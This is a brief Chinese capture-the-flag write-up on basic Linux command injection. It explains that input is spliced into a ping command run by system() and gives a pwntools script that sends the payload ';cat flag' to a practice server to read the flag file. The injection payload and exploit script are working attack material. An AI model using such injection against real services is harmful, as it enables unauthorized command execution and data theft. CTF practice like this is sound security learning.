Linux命令执行基础

将我们的输入拼接到dest处，然后执行system，所以直接输入”;cat flag"分割前面的ping，执行cat flag

#!/usr/bin/env python2
#-*- coding=UTF-8 -*-
from pwn import *
context.log_level = 'debug'

sh = remote('node3.buuoj.cn',25381)
sh.sendlineafter("choose:\n","1")
sh.sendlineafter("address:\n",";cat flag")
sh.interactive()
